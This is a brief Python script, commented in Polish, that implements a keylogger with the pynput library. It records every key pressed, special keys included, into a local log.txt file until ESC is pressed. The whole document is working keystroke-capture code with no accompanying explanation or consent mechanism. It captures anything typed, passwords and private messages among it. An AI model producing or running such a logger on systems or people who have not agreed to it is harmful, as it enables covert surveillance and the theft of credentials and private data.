from pynput import keyboard

log_file = "log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Dla klawiszy specjalnych
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def on_release(key):
    if key == keyboard.Key.esc:
        # Zatrzymujemy program po naciśnięciu ESC
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
